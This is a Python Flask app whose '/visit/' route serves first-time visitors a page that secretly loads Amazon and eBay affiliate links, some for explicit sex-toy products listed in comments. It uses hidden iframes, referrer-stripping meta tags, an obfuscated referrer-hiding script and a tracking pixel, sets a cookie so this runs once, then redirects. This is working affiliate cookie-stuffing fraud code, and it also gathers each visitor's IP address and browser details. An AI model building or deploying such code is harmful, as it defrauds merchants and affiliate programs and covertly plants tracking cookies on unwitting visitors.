import random

from flask import (Flask, flash, jsonify, make_response, redirect,
                   render_template, request, url_for)

app = Flask(__name__)

# 2sDFFFh Utimi Male Penis Vacuum Pump Air Enlarger Extender Prolong Enhancer
# 2LOSgya Electric Men's High-Vacuum Penis Pump Air Pressure Setting Device With 2 Extra Sleeves, USB Rechargeable,
# Increase the Size and Strength
# 2LfxiaC Utimi Rechargeable Penis Extender Cock Vacuum Pump Erection Device for Men, Flesh Included, Smart Control
# 2LP457l Utimi Penis Pump Powerful Vacuum Pump Training Penis Extension Sex Toy with Soft TPE Sleeve
# 2sxNBaO Male Masturbator FeelinGirl 3D Silicone Realistic
# 2H7NLep Zemalia Male Masturbators Sex Toys 3D Realistic Vagina and Mouth Masturbator with Teeth and Tongue
# Masturbation Cup
# 2LLPB89 Male Masturbator Sex Toys, ZEMALIA Diana Realistic Vagina Pocket Pussy Adult Toy Built-in Cock Ring
# Close-Ended Stroker for Man Masturbation
# 2LQqCjZ Xise Sex 3D Love Doll Masturbator with Vagina and Anal, 13 Pound
# 2sxNUT0 Sex Virgin Pussy Ass Masturbator for Male - 3D Realistic Butt
# Anal Vaginal Adult Sex Toys for Men Masturbation


@app.route('/visit/')
def azon():
    # url = request.args.get('url')
    url = "#"
    ip = str(request.remote_addr)
    user_agent = request.user_agent
    platform = str(user_agent.platform)
    browser = str(user_agent.browser)
    version = str(user_agent.version)
    language = str(user_agent.language)
    referrer = str(request.referrer)
    if not request.cookies.get('visitor-reference'):
        azon_ids = [
            "2sDFFFh",
            "2LOSgya",
            "2LfxiaC",
            "2LP457l",
            "2sxNBaO",
            "2H7NLep",
            "2LLPB89",
            "2LQqCjZ",
            "2sxNUT0"]
        azon_html = """
        <html>
        <head>
        <meta name="referrer" content="none">
        <meta name="referrer" content="never">
        <meta name="referrer" content="no-referrer">
        </head>
        <body>
        """
        for id in azon_ids:
            azon_html += """<a href="https://amzn.to/{}" target="_blank" rel="noreferrer"></a>""".format(
                id)
            # This contains the cookie to seal in users browser
        azon_cookie = random.choice(azon_ids)
        azon_html += """<iframe style="display:none"
        src="javascript:window.location.replace('https://amzn.to/{}')"></iframe>""".format(azon_cookie)
        ebay_html = """<iframe style="display:none"
        src="javascript:window.location.replace('http://rover.ebay.com/rover/1/711-53200-19255-0/1?icep_ff3=9&pub=5575397796&toolid=10001&campid=5338318632&customid=&icep_uq=male+sex+toy&icep_sellerId=&icep_ex_kw=&icep_sortBy=12&icep_catId=&icep_minPrice=&icep_maxPrice=&ipn=psmain&icep_vectorid=229466&kwid=902099&mtid=824&kw=lg')"></iframe>"""
        azon_html += ebay_html
        hotlink_js = """
        <script> var hotlink=function(e,t){"use strict";for(var
        r,n,i,o="http://www.w3.org/1999/xhtml",l="http://purl.eligrey.com/hotlink",c=t.documentElement,a=e.navigator.userAgent,s=~a.indexOf("Gecko/"),f=~a.indexOf("MSIE"),u=e.opera,d=function(e){if(e.click)e.click();else{var
        r=t.createEvent("Event");r.initEvent("click",!0,!0),e.dispatchEvent(r)}},h=function(e,t){return
        e.appendChild(t)},m=function(e,r,n){return(n||t).createElementNS(e,r)},g=function(e,t,r){var
        n=e.getAttribute(t);return
        3===arguments.length&&(r===!1?e.removeAttribute(t):e.setAttribute(t,r)),n},p=function(e){var
        t,r,n,i=e.parentNode,c=i.insertBefore(m(l,"img"),e),a=h(c,m(o,"iframe")),p=m(o,"a",a.contentDocument),v=g(e,"data-src"),y=+g(e,"width"),b=+g(e,"height");for((s||u)&&(y+=16,b+=16),t=e.attributes,r=t.length;r--;)n=t[r],g(c,n.name,n.value);i.removeChild(e),a.style.verticalAlign="bottom",a.style.width=y+"px",a.style.height=b+"px",a.scrolling="no",a.style.border=0,p.rel="noreferrer",p.href=v,(s||f)&&(a.src=v),d(p)},v=!1,y=[],b=!1,k=("referrerPolicy"in
        new
        Image),w=function(e){k?(e.referrerPolicy="no-referrer",e.src=g(e,"data-src",!1)):v?b?p(e):e.src=g(e,"data-src",!1):y.push(e)},x="about:blank",E=function(){v=!0,b=""===r.contentDocument.referrer;for(var
        e=0,t=y.length;t>e;e++)w(y[e])},A=m(o,"style"),L=t.querySelectorAll("img[data-src]"),R=L.length;R--;)i=L[R],i.namespaceURI===o&&w(i);return
        k?w:(h(A,t.createTextNode("@namespace'"+l+"';img{display:inline-block;vertical-align:bottom}")),h(c,A),r=h(c,m(o,"iframe")),n=m(o,"a",r.contentDocument),r.style.visibility="hidden",r.style.height=r.style.border=0,n.rel="noreferrer",(s||f)&&(x="undefined"!=typeof
        Blob&&"undefined"!=typeof URL?URL.createObjectURL(new
        Blob([""],{type:"text/plain"})):"/robots.txt"),n.href=x,r.addEventListener("load",E,!1),(s||f)&&(r.src=n.href),d(n),w)}(self,document);
        </script>

        <script>
        var image = new Image(1, 1);
        image.setAttribute("data-src",
        "http://rover.ebay.com/roverimp/1/711-53200-19255-0/1?ff3=9&pub=5575397796&toolid=10001&campid=5338318632&customid=&uq=male+sex+toy&mpt=[CACHEBUSTER]");
        document.documentElement.appendChild(image);
        hotlink(image);
        </script>
        """
        azon_html += hotlink_js
        azon_html += """<script>window.location.replace('{}');</script>""".format(
            url)
        azon_html += """
        </body>
        </html>
        """
        html = "Setting a cookie for 'visitor-reference': {} {} {} {} {} {}".format(str(ip), str(platform),
        str(browser), str(version), str(language), str(referrer))
        res = make_response(azon_html)
        res.set_cookie('visitor-reference', '1', max_age=60 * 60 * 24)
    else:
        res = make_response(
            "<html><body><script>window.location.replace('{}');</script></body></html>".format(url))
    return res

if __name__ == '__main__':
    app.run()
